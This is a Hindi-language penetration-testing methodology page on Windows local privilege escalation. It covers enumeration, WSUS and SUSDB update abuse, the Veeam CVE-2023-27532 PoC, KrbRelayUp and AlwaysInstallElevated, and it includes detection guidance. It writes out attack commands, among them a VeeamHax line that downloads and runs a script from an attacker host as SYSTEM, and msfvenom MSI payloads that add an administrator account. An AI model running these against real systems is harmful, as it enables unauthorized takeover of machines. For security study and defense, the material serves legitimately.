# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

यह पेज कई बुनियादी guides से सामान्य Windows privilege-escalation methodology को एक जगह समेटता है।<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> इसका व्यावहारिक enumeration flow community workshops और checklists से भी जानकारी लेता है।<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> ऐतिहासिक attack सामग्री में Windows privilege escalation पर DerbyCon presentation शामिल है।<sup>[[5]](#references)</sup>

## शुरुआती Windows सिद्धांत

### Access Tokens

**अगर आपको नहीं पता कि Windows access tokens क्या हैं, तो आगे बढ़ने से पहले यह पेज पढ़ें:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs के बारे में अधिक जानकारी के लिए यह पेज देखें:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**अगर आपको नहीं पता कि Windows में integrity levels क्या होते हैं, तो आगे बढ़ने से पहले यह पेज पढ़ें:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows में कई चीजें ऐसी हैं जो **आपको system का enumeration करने से रोक सकती हैं**, executables चलाने से रोक सकती हैं या आपकी **गतिविधियों का पता लगा सकती हैं**। privilege escalation enumeration शुरू करने से पहले, आपको निम्नलिखित **पेज पढ़ना** चाहिए और इन सभी **defense mechanisms का enumeration करना** चाहिए:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Physical access से offline UEFI NVRAM edit को pre-boot DMA और Windows `SYSTEM` memory-patching chain में भी बदला जा सकता है:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` के ज़रिए launch किए गए UIAccess processes का दुरुपयोग करके, AppInfo secure-path checks को bypass करने पर बिना prompts के High IL तक पहुँचा जा सकता है। समर्पित UIAccess/Admin Protection bypass workflow यहाँ देखें:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation का दुरुपयोग करके arbitrary SYSTEM registry write (RegPwn) किया जा सकता है:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

हाल के Windows builds में **SMB arbitrary-port** LPE path भी आया है, जिसमें privileged local NTLM authentication को reused SMB TCP connection के ज़रिए reflect किया जाता है:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System जानकारी

मौजूदा PowerShell session से local inventory के लिए [Windows Enumeration with .NET](../basic-powershell-for-pentesters/dotnet-enumeration.md) देखें। ये examples अलग enumeration executables launch किए बिना नीचे दिए गए checks के पूरक हैं।

### Version info enumeration

जाँचें कि Windows version में कोई ज्ञात vulnerability है या नहीं (लागू किए गए patches भी जाँचें)।

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### वर्ज़न Exploits

Microsoft की सुरक्षा कमजोरियों के बारे में विस्तृत जानकारी खोजने के लिए यह [site](https://msrc.microsoft.com/update-guide/vulnerability) उपयोगी है। इस database में 4,700 से अधिक सुरक्षा कमजोरियाँ हैं, जो Windows environment के **विशाल attack surface** को दिखाती हैं।

**सिस्टम पर**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas में watson शामिल है)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — OS build, installed updates और चुने हुए advisory candidates की सूची बनाता है; किसी परिणाम को लागू मानने से पहले सटीक product और superseding updates की पुष्टि करें।

किसी version-specific local exploit के लिए, OS architecture के साथ **running process architecture** भी जाँचें। 64-bit Windows पर, 32-bit process [WOW64 file-system redirection](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector) के अधीन होता है: `%windir%\System32` आमतौर पर 32-bit system directory पर जाता है, जबकि `%windir%\Sysnative` उस process को native system directory तक पहुँच देता है। यह alias 64-bit process के लिए उपलब्ध नहीं है। OS build या missing-KB candidate से exploitability साबित नहीं होती; सटीक issue के लिए [Microsoft security bulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) के साथ running build, installed या superseding update, process architecture और exploit prerequisites की तुलना करें।

Service-memory-corruption के उदाहरण के लिए, [client-controlled MIDI shared-memory ring offsets](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions) देखें। प्रकाशित stack offsets केवल test किए गए build पर लागू होते हैं; `LOCAL SERVICE` तक पहुँचना, बाद में [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) के ज़रिए `SYSTEM` तक पहुँचने से अलग है।<sup>[[44]](#references)</sup>

**सिस्टम जानकारी के साथ स्थानीय रूप से**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploits के Github repos:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

क्या env variables में कोई credential/Juicy info सेव है?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell इतिहास

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

लिखने योग्य [PowerShell profile](../basic-powershell-for-pentesters/#powershell-profile-startup-injection) startup-execution का एक अलग सुराग है; इसे privilege escalation मानने से पहले जांचें कि कोई अधिक privileged user वास्तव में उस profile को लोड करता है या नहीं।

### PowerShell Transcript फ़ाइलें

इसे चालू करने का तरीका आप [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) पर जान सकते हैं।

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` केवल एक उदाहरण है। [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) आम तौर पर हर उपयोगकर्ता के Documents फ़ोल्डर में लिखती है, लेकिन `OutputDirectory` setting या `Start-Transcript -OutputDirectory` फ़ाइलों को किसी shared या hidden फ़ोल्डर में redirect कर सकते हैं। Transcript की समीक्षा करने से पहले प्रभावी output path और file ACL जाँचें: उसमें command arguments और output हो सकते हैं, जिनमें credentials भी शामिल हैं। किसी readable transcript को केवल तभी lead मानें, जब उसकी सामग्री किसी ऐसे higher-privilege identity का खुलासा करे जिसका उपयोग किया जा सके और वह identity संबंधित context में log on कर सके।

### PowerShell Module Logging

PowerShell pipeline executions का विवरण रिकॉर्ड किया जाता है, जिसमें execute किए गए commands, command invocations और scripts के कुछ हिस्से शामिल होते हैं। हालाँकि, execution का पूरा विवरण और output results शायद capture न किए जाएँ।

इसे enable करने के लिए, documentation के "Transcript files" section में दिए गए निर्देशों का पालन करें और **"Powershell Transcription"** के बजाय **"Module Logging"** चुनें।

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowersShell logs से पिछले 15 events देखने के लिए, आप यह execute कर सकते हैं:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

स्क्रिप्ट के निष्पादन की गतिविधियों और पूरी सामग्री का रिकॉर्ड कैप्चर किया जाता है, जिससे कोड का हर ब्लॉक चलते समय दर्ज हो जाता है। यह प्रक्रिया हर गतिविधि का व्यापक ऑडिट ट्रेल सुरक्षित रखती है, जो फॉरेंसिक जाँच और दुर्भावनापूर्ण व्यवहार का विश्लेषण करने में उपयोगी है। निष्पादन के समय सभी गतिविधियों का दस्तावेज़ीकरण करने से प्रक्रिया की विस्तृत जानकारी मिलती है।

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block के logging events Windows Event Viewer में इस path पर मिल सकते हैं: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
पिछले 20 events देखने के लिए आप इसका उपयोग कर सकते हैं:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### इंटरनेट सेटिंग्स

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### ड्राइव‌లు

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

पहले दिए गए मार्गदर्शन में जोखिम का सार इस प्रकार बताया गया था:

यदि अपडेट http**S** के बजाय http का उपयोग करके अनुरोध किए जाते हैं, तो आप सिस्टम को compromise कर सकते हैं।

HTTP WSUS endpoint, अपडेट-metadata interception की जांच का संकेत है। Exploitation इस बात पर भी निर्भर करता है कि client उस WSUS server का उपयोग करता है या नहीं, attacker उसके traffic को intercept या control कर सकता है या नहीं, और client की अपडेट पर भरोसे तथा installation policy क्या है। केवल URL से code execution साबित नहीं होता। [Microsoft, WSUS metadata के लिए TLS की अनुशंसा करता है](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

आप cmd में निम्नलिखित चलाकर जांच शुरू कर सकते हैं कि network में non-SSL WSUS update का उपयोग होता है या नहीं:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

या PowerShell में निम्नलिखित:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

यदि आपको इनमें से किसी तरह का जवाब मिले:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

और यदि `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` या `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` का मान `1` है।

मूल लागू होने का कथन यह था:

तब, **इसका exploit किया जा सकता है।** यदि आखिरी registry का मान `0` है, तो WSUS entry को अनदेखा कर दिया जाएगा।

जब `UseWUServer` का मान `1` होता है, तो Windows Update कॉन्फ़िगर की गई intranet service का उपयोग करता है। इससे HTTP interception path की एक पूर्वशर्त की पुष्टि होती है, लेकिन यह साबित नहीं होता कि interception, malicious update की स्वीकृति या elevated installation संभव है। जब इसका मान `0` होता है, तो इस policy द्वारा कॉन्फ़िगर किया गया विशिष्ट WSUS endpoint चुना नहीं जाता।

इन vulnerabilities का exploit करने के लिए आप [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) जैसे tools का उपयोग कर सकते हैं—ये non-SSL WSUS traffic में 'fake' updates inject करने वाली MiTM weaponized exploit scripts हैं।

यहाँ research पढ़ें:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**पूरी report यहाँ पढ़ें**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
मूल रूप से, यह वही flaw है जिसका यह bug exploit करता है:

> यदि हमारे पास अपने local user proxy को modify करने की अनुमति है, और Windows Updates Internet Explorer की settings में कॉन्फ़िगर किए गए proxy का उपयोग करता है, तो हम अपने ही traffic को intercept करने और अपने asset पर elevated user के रूप में code चलाने के लिए locally [PyWSUS](https://github.com/GoSecure/pywsus) चला सकते हैं।
>
> इसके अलावा, चूँकि WSUS service मौजूदा user की settings का उपयोग करती है, इसलिए यह उसके certificate store का भी उपयोग करेगी। यदि हम WSUS hostname के लिए self-signed certificate बनाकर इस certificate को मौजूदा user के certificate store में जोड़ते हैं, तो हम HTTP और HTTPS, दोनों तरह के WSUS traffic को intercept कर सकेंगे। Certificate पर trust-on-first-use प्रकार का validation लागू करने के लिए WSUS, HSTS-जैसी किसी mechanism का उपयोग नहीं करता। यदि प्रस्तुत certificate user द्वारा trusted है और उसका hostname सही है, तो service उसे स्वीकार कर लेगी।

आप इस vulnerability को [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) tool का उपयोग करके exploit कर सकते हैं (जब यह उपलब्ध हो जाए)।

### WSUS administrator-नियंत्रित updates

एक अलग path तब मौजूद होता है जब मौजूदा identity किसी WSUS server पर updates **publish और approve** कर सकती है। Server के `WSUS Administrators` group की effective membership और किसी भी delegated WSUS permissions की जाँच करें, फिर उस client computer group की पहचान करें जिसे approved update मिलेगा। [Microsoft updates approve करने के लिए WSUS Administrator privileges आवश्यक बताता है](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), और [publishing trust relationship का दस्तावेज़ देता है](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): clients को locally published content के लिए इस्तेमाल किए गए signing certificate पर trust करना होगा। इसे escalation path मानने से पहले पुष्टि करें कि candidate update signed और accepted है, target पर लागू होता है, और अधिक privileged context में install होता है। केवल HTTP `WUServer` value या group name से ये शर्तें साबित नहीं होतीं।

### SUSDB custom-update का दुरुपयोग: `.txt`/`.esd` के ज़रिए unsigned payloads

यह HTTP WSUS connection को intercept करने से अलग trust-boundary failure है: इसके लिए **WSUS database (`SUSDB`) की stored procedures** तक इतनी access चाहिए कि custom update publish और approve किया जा सके। इसका एक व्यावहारिक entry path, upstream WSUS computer account को `SUSDB` होस्ट करने वाले अलग MSSQL server तक relay करना है; सटीक prerequisite deployment पर निर्भर करती है, इसलिए SQL administrator rights मानने के बजाय पहले `EXECUTE` permissions enumerate करें।<sup>[[38]](#references)[[39]](#references)</sup>

अलग attack path के लिए, जो WSUS client authentication को HTTP/8530 से LDAP, SMB या AD CS तक relay करता है, देखें [NTLM relay के लिए WSUS HTTP का दुरुपयोग](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### External-database relay और procedure rights की पुष्टि करें

जिन deployments में WSUS किसी external SQL Server का उपयोग करता है, वहाँ पहले जाँचें कि WSUS server account database से authenticate कर सकता है या नहीं, और NTLM relay उस listener तक पहुँचता है या नहीं। Server का SQL role update-publishing procedures उपलब्ध करा सकता है, भले ही direct table writes से इनकार किया गया हो; `SUSDB` पर `UPDATE` विफल होने का अर्थ यह नहीं कि publishing अवरुद्ध है। Custom update का प्रयास करने से पहले, किसी अधिकृत SQL session में effective identity, role membership और procedure permissions की जाँच करें।<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

लाइव procedure definitions और इंस्टॉल किया गया `SoftwareDistributionPackage.xsd` मान्य update metadata को फिर से बनाने में उपयोगी हैं। Bundle parent और payload child, दोनों को `UpdateIdentity` (fragment type `1`), `LocalizedProperties` (`4`) और `ExtendedProperties` (`2`) की आवश्यकता होती है; हर `spImportUpdate` call से मिले local revision ID को दर्ज करें और bundle relationship, digests, size, content URL तथा revision को एकसमान रखें। यह एक stateful publishing workflow है, इसलिए stored procedure की एक सफल call इस बात का प्रमाण नहीं है कि client-side execution हुआ।<sup>[[38]](#references)</sup>

#### Update बनाएं, target करें और approve करें

Custom-update workflow, वैध WSUS procedures को restricted publishing API के रूप में उपयोग करता है। महत्वपूर्ण state transitions ये हैं:<sup>[[38]](#references)</sup>

| Stage | Relevant stored procedures |
| --- | --- |
| Update metadata import करें | `spImportUpdate` |
| Prerequisite, localized और extended XML fragments store करें | `spSaveXMLFragment` |
| Content digest को attacker-controlled URL से associate करें | `spSetBatchURL` |
| Computer group की सूची बनाएं/बनाएं और client को उसमें जोड़ें | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| उस group के लिए installation approve करें | `spDeployUpdate` with `@actionID = 0` and `@isAssigned = 1` |

File name, digests, size और `CommandLineInstallation` handler, imported metadata/fragments में एक-दूसरे से मेल खाने चाहिए। Content URL और target group assign करने के बाद, अंतिम approval कुछ इस तरह दिखता है; उदाहरण वाले GUIDs को दोबारा इस्तेमाल करने के बजाय नए update, group और deployment identifiers का उपयोग करें।<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Extension-driven signature bypass

WSUS आम तौर पर मनमाने unsigned executable content को अस्वीकार करता है। हालांकि, `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` में, .NET का `VerifyFile` path तब certificate-check flag को false पर सेट कर देता है जब दिया गया filename `.txt` या `.esd` पर समाप्त होता है; `CheckCertificateSignature` को यह साबित किए बिना छोड़ दिया जाता है कि bytes वास्तव में text या कोई वैध ESD image हैं। इसलिए, उदाहरण के लिए `payload.exe.txt` नाम वाला अपरिवर्तित PE content verification पास कर सकता है और बाद में update के command-line installation handler द्वारा launch किया जा सकता है। यह signature forgery नहीं, बल्कि policy/type-confusion bug है।<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS-compatible staging और automation

`spDeployUpdate` को कॉल करने से WSUS पंजीकृत content फ़ेच करता है। Origin को BITS की HTTP अपेक्षाएँ पूरी करनी चाहिए: केवल URL तक पहुँच होना पर्याप्त नहीं है, क्योंकि transfer में शुरुआती `HEAD`/`GET` flow और byte-range requests का उपयोग होता है। Range support के बिना कोई server WSUS synchronization `EventId=364` उत्पन्न करता है, जिसमें बताया जाता है कि BITS को Range protocol header चाहिए।<sup>[[39]](#references)</sup>

Research PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) import/fragment/URL/group/deployment chain के लिए ज़रूरी SQL बनाता है, उसे execute करने के लिए modified MSSQL client शामिल करता है, और content staging के लिए `BitsWebServer.py` देता है। एक न्यूनतम authorized-lab invocation यह है:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Unattended execution और retry persistence

Client-side interaction policy पर निर्भर करता है। `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` में विकल्प `4 - Auto download and schedule install` से स्वीकृत update, उपयोगकर्ता द्वारा उसे मैन्युअल रूप से चुनने के बिना, कॉन्फ़िगर किए गए शेड्यूल के अनुसार डाउनलोड और इंस्टॉल होता है। परीक्षण में, callback process के exit होने के तुरंत बाद ऐसा payload जिसका update विफल/अधूरा रहा, फिर से ऑफ़र किया गया। इसलिए retry behavior बार-बार होने वाली execution persistence बन सकता है; यह ध्यान खींचता है क्योंकि client update-failed state दिखाता है।<sup>[[39]](#references)</sup>

#### Detection और hardening pivots

इस chain से उपयोगी server- और client-side pivots हैं:<sup>[[39]](#references)</sup>

- `SUSDB` में `spCreateTargetGroup`, `spSetBatchURL` और `spDeployUpdate` के execution का audit करें; नए targeting groups, बाहरी content origins, `.txt`/`.esd` update payloads और अप्रत्याशित principals (खासकर non-computer accounts) द्वारा किए गए deployments की जाँच करें।
- `C:\Program Files\Update Services\LogFiles` में `ContentSyncAgent`, `FileVerified`, गलत वर्तनी वाले `FileVerficationFailed` और `EventId=364` देखें; verification को payload extension और content magic से मिलाएँ, suffix पर भरोसा न करें।
- ऐसे Windows Update installation खोजें जो बार-बार विफल/retry हो रहे हों, और `.txt` या `.esd` नाम वाले content से PE execution या अप्रत्याशित child/network activity खोजें।
- जहाँ समर्थित हो, database service के लिए Extended Protection for Authentication अनिवार्य करें और database network access को WSUS server तथा अधिकृत administrative systems तक सीमित रखें। Custom-update procedures पर `EXECUTE` अधिकार न्यूनतम रखें और उनका audit करें।

## Third-Party Auto-Updaters और Agent IPC (local privesc)

कई enterprise agents localhost IPC surface और privileged update channel उपलब्ध कराते हैं। यदि enrollment को attacker server की ओर मोड़ा जा सके और updater rogue root CA या कमज़ोर signer checks पर भरोसा करे, तो local user एक malicious MSI भेज सकता है, जिसे SYSTEM service इंस्टॉल कर देती है। एक generalized technique (Netskope stAgentSvc chain – CVE-2025-0309 पर आधारित) यहाँ देखें:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 के ज़रिए SYSTEM)

मूल version-specific विवरण और reconnaissance note यह थे:

Veeam B&R < `11.0.1.1261` **TCP/9401** पर localhost service उपलब्ध कराता है, जो attacker-controlled messages process करती है और **NT AUTHORITY\SYSTEM** के रूप में arbitrary commands चलाने देती है।<sup>[[12]](#references)</sup>

- **Recon**: listener और version की पुष्टि करें, जैसे `netstat -ano | findstr 9401` और `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`।

Veeam Backup & Replication और Cloud Connect डिफ़ॉल्ट रूप से **TCP/9401** पर core backup service इस्तेमाल करते हैं। [Veeam की advisory](https://www.veeam.com/kb4424) backup network perimeter के भीतर encrypted configuration-database credentials के unauthenticated disclosure का वर्णन करती है; एक अलग public PoC **NT AUTHORITY\SYSTEM** के रूप में command-execution path दिखाता है।<sup>[[12]](#references)</sup> Service localhost से आगे भी bind हो सकती है, इसलिए इसका वास्तविक address और PID जाँचें।

- **Recon**: पुष्टि करें कि TCP/9401 `Veeam.Backup.Service.exe` का है, फिर installed product और patch metadata देखें। `netstat -ano | findstr 9401` और `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` संकेत हैं, पूर्ण patch check नहीं।
- **Fixed floors**: Veeam **11a build 11.0.1.1261 P20230227** और **12 build 12.0.0.1420 P20230223** को पहली fixed releases बताता है; इससे पहले की releases प्रभावित हैं। केवल चार-भाग वाला file version, उन्हीं build numbers पर unpatched base build और बाद के patch में अंतर नहीं बता सकता। किसी boundary build को fixed मानने से पहले [vendor build history](https://www.veeam.com/kb2680) से patch identifier सत्यापित करें।
- **Exploit**: आवश्यक Veeam DLLs के साथ `VeeamHax.exe` जैसा PoC उसी directory में रखें, फिर local socket पर SYSTEM payload trigger करें:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

सेवा command को SYSTEM के रूप में execute करती है।

उद्धृत PoC अतिरिक्त prerequisites पूरी होने पर SYSTEM के रूप में command execution दिखाता है; vendor की advisory credential-disclosure issue का वर्णन करती है।

## KrbRelayUp

मूल default-environment विवरण यह था:

विशिष्ट परिस्थितियों में Windows **domain** environments में **local privilege escalation** vulnerability मौजूद होती है। इन परिस्थितियों में ऐसे environments शामिल हैं जहाँ **LDAP signing enforced नहीं है,** users के पास ऐसे self-rights हैं जिनसे वे **Resource-Based Constrained Delegation (RBCD)** configure कर सकते हैं, और users के पास domain में computers बनाने की क्षमता है। ध्यान दें कि ये **requirements** **default settings** में पूरी होती हैं।

एक local Kerberos relay, कम privileges वाले logon से privileged directory write तक पहुँच सकता है, जब कोई उपयुक्त COM server authenticate करे और relayed principal के पास target object पर rights हों। [KrbRelay दस्तावेज़](https://github.com/cube0x0/KrbRelay) RBCD और `msDS-KeyCredentialLink` (shadow-credential) LDAP writes, दोनों को दर्ज करते हैं; KrbRelayUp इनमें से कुछ paths को automate करता है। RBCD chain के लिए लागू delegation और target-object rights आवश्यक हैं, जबकि shadow-credential chain के लिए key-credential write rights और certificate authentication path को support करने वाला KDC आवश्यक है। इनमें से कोई भी path केवल domain membership से संभव नहीं होता।

वास्तविक DC की [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) और [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) policy, relayed identity का object ACL, और चुनी गई COM class के authentication और impersonation levels जाँचें। Caller का logon type और credential context मायने रखता है: WinRM session, interactive या new-credentials logon से अलग व्यवहार कर सकता है। Firewall/OXID routing और installed updates भी परिणाम बदल सकते हैं। Permissive policy या matching ACL को समीक्षा के लिए संभावित मामला मानें; passive enumeration से COM coercion, relay authentication या directory writes शुरू नहीं होने चाहिए। Machine-account shadow credential से machine ticket मिल सकता है और, केवल तभी जब उस account के पास आवश्यक directory replication rights हों, एक अलग DCSync path संभव हो सकता है।

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) में **exploit खोजें**

Attack के flow के बारे में अधिक जानकारी के लिए देखें [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**यदि** ये 2 रजिस्टर **enabled** हैं (value **0x1** है), तो किसी भी privilege level वाले users `*.msi` files को NT AUTHORITY\\**SYSTEM** के रूप में **install** (execute) कर सकते हैं।

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

यदि आपके पास meterpreter session है, तो आप module **`exploit/windows/local/always_install_elevated`** का उपयोग करके इस technique को automate कर सकते हैं।

### PowerUP

Power-up से `Write-UserAddMSI` command का उपयोग करके current directory में privileges escalate करने के लिए Windows MSI binary बनाएँ। यह script एक precompiled MSI installer लिखती है, जो user/group जोड़ने का prompt देता है (इसलिए आपको GIU access की आवश्यकता होगी):

```
Write-UserAddMSI
```

बनाई गई binary को चलाकर privileges escalate करें।

### MSI Wrapper

